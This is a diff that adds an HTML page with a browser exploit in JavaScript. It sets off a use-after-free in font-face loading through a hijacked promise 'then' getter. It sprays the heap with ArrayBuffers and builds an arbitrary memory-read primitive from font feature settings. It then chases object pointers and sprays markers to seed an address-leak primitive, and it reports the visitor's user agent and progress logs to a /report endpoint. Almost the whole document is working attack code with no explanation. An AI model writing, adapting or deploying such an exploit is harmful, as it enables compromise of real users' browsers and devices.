@@ -1,0 +1,101 @@
+<!doctype html><html><head><meta charset="utf-8"><title>CSF init_arw port</title>
+<style>body{margin:0;padding:14px;background:#07090d;color:#cfe3ff;font-family:system-ui}
+#o{white-space:pre-wrap;font:12px/1.4 ui-monospace,monospace;color:#9fb4d6}</style></head>
+<body><div id="s">init_arw</div><pre id="o"></pre><script>
+var out=document.getElementById("o"),LOG=[];
+function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
+function log(s){out.textContent+=s+"\n";LOG.push(s);try{send();}catch(e){}}
+var SZ=0xb8, OFF_FS=0x28, OFF_FS_SZ=0x30, OFF_FS_CAP=0x34, OFF_ST=0x7a;
+function hx(lo,hi){return "0x"+("00000000"+(hi>>>0).toString(16)).slice(-8)+("00000000"+(lo>>>0).toString(16)).slice(-8);}
+function plaus(lo,hi){return hi<=0xffff && (lo%8)===0 && (hi!==0||lo>=0x10000);}
+function add64(lo,hi,d){var l=(lo>>>0)+d,h=(hi>>>0)+((l>0xffffffff)?1:0);return {lo:l>>>0,hi:h>>>0};}
+
+async function uaf(){
+  var SPRAY=0xb0, abs=[], uaf_font=null, uaf_ab=null;
+  var sr="@font-face{font-family:spray;src:local(systemfont);unicode-range:U+0043;}";
+  var ur="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
+  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+  document.fonts.add(A); void A.loaded;
+  var st=document.createElement("style"); document.head.append(st);
+  for(var i=0;i<SPRAY/4;i++) st.sheet.insertRule(sr, st.sheet.cssRules.length);
+  var ui=st.sheet.cssRules.length; st.sheet.insertRule(ur, st.sheet.cssRules.length);
+  for(var i=SPRAY/4;i<SPRAY;i++) st.sheet.insertRule(sr, st.sheet.cssRules.length);
+  void document.body.offsetHeight;
+  var ot=FontFace.prototype.then, fired=false;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==A) return undefined; fired=true; log("[UAF] getter(A)");
+    st.sheet.deleteRule(ui); void document.body.offsetHeight;
+    for(var i=st.sheet.cssRules.length-1;i>=0;i--){ if(st.sheet.cssRules[i].cssText.indexOf("spray")!==-1) st.sheet.deleteRule(i); }
+    void document.body.offsetHeight;
+    for(var i=0;i<SPRAY;i++){ var ab=new ArrayBuffer(SZ); var dv=new DataView(ab); dv.setUint32(8,1,true); dv.setUint8(OFF_ST,3); abs.push(ab); }
+    return undefined;}});
+  var fs=null; try{ fs=await document.fonts.load("1em a, b","AB"); }catch(e){}
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+  if(!fs||fs.length!==2){ log("[UAF] none"); return null; }
+  for(var i=0;i<fs.length;i++){ if(fs[i].unicodeRange==="U+0-10FFFF"){ uaf_font=fs[i]; break; } }
+  for(var i=0;i<abs.length;i++){ if(new DataView(abs[i]).getUint32(8,true)===2){ uaf_ab=abs[i]; break; } }
+  log("[UAF] font="+(uaf_font?"FOUND":"none")+" ab="+(uaf_ab?"FOUND":"none"));
+  if(!uaf_font||!uaf_ab) return null;
+  function setPtr(dv,off,lo,hi){ dv.setUint32(off,lo>>>0,true); dv.setUint32(off+4,hi>>>0,true); }
+  function read(lo,hi,size){
+    var ab=new ArrayBuffer(size), u8=new Uint8Array(ab), dv=new DataView(uaf_ab), o=0;
+    while(o<size){ setPtr(dv,OFF_FS,(lo+o)>>>0,hi); dv.setInt32(OFF_FS_SZ,1,true); dv.setInt32(OFF_FS_CAP,1,true);
+      var s=uaf_font.featureSettings; for(var i=1;i<5&&o<size;i++) u8[o++]=s.charCodeAt(i)&0xff; }
+    return ab;
+  }
+  return {font:uaf_font,ab:uaf_ab,read:read};
+}
+
+function rd64(r,lo,hi){ var b=new Uint8Array(r.read(lo,hi,8));
+  return {lo:(b[0]|b[1]<<8|b[2]<<16|b[3]<<24)>>>0, hi:(b[4]|b[5]<<8|b[6]<<16|b[7]<<24)>>>0}; }
+function rd8(r,lo,hi){ var b=new Uint8Array(r.read(lo,hi,1)); return b[0]; }
+
+(async function(){
+  log("init_arw port — NF/7.0.3.12.11");
+  var r=await uaf(); if(!r){ log("END no primitive"); return; }
+  var dv=new DataView(r.ab);
+  var wrap={lo:dv.getUint32(0x60,true),hi:dv.getUint32(0x64,true)};
+  log("[1] m_wrapper="+hx(wrap.lo,wrap.hi));
+  var target=rd64(r,wrap.lo,wrap.hi+0, /*unused*/0)?null:null;
+  var w=new Uint8Array(r.read(wrap.lo,wrap.hi,32));
+  var face={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0, hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+  log("[2] FontFace="+hx(face.lo,face.hi));
+  if(!plaus(face.lo,face.hi)){ log("[2] implausible"); return; }
+  // chase FontFace::m_backing across base offsets, validate via CSSFontFace+0x7A==3
+  var backing=null, offFound=0;
+  var offs=[0x10,0x18,0x20,0x28,0x30,0x38,0x40,0x48];
+  for(var i=0;i<offs.length;i++){
+    var p=add64(face.lo,face.hi,offs[i]);
+    var v=rd64(r,p.lo,p.hi);
+    if(!plaus(v.lo,v.hi)){ log("[3] +"+("0x"+offs[i].toString(16))+" = "+hx(v.lo,v.hi)+" skip"); continue; }
+    var st=rd8(r,v.lo,v.hi+0);
+    var st7=0; try{ st7=rd8(r,v.lo,v.hi); }catch(e){}
+    // validate: read +0x7A
+    var q=add64(v.lo,v.hi,0x7a); var sv=0;
+    try{ sv=rd8(r,q.lo,q.hi); }catch(e){ sv=-1; }
+    log("[3] +"+("0x"+offs[i].toString(16))+" -> "+hx(v.lo,v.hi)+"  [+0x7a]="+sv+(sv===3?"  <== CSSFontFace!":""));
+    if(sv===3){ backing=v; offFound=offs[i]; break; }
+  }
+  if(!backing){ log("[3] no m_backing candidate validated"); log("done"); return; }
+  log("[4] m_backing offset = 0x"+offFound.toString(16)+"  CSSFontFace="+hx(backing.lo,backing.hi));
+  // marker spray + scan from backing.alignUp(0x4000)
+  var marker=0x41414141;
+  var leakObj={a:marker};
+  var props=[];
+  for(var i=0;i<0x100;i++){ props.push({value:marker}); props.push({value:leakObj}); }
+  var start=add64((backing.lo + 0x3fff) & ~0x3fff, backing.hi, 0);
+  log("[5] scan start="+hx(start.lo,start.hi)+"  spraying props…");
+  Object.defineProperties({}, props);
+  var found=null;
+  for(var off=0; off<0x4000 && !found; off+=0x100){
+    var a=add64(start.lo,start.hi,off), b;
+    try{ b=new Uint8Array(r.read(a.lo,a.hi,0x100)); }catch(e){ continue; }
+    var bdv=new DataView(b.buffer);
+    for(var i=0;i+0x1c<=b.length;i+=4){
+      if(bdv.getUint32(i,true)===0x41414141 && bdv.getUint32(i+0x18,true)===0xe){ found=add64(a.lo,a.hi,i); break; }
+    }
+  }
+  log(found?("[6] MARKER at "+hx(found.lo,found.hi)+"  <== addrof seed"):"[6] marker not found");
+  log("done");
+})();
+</script></body></html>
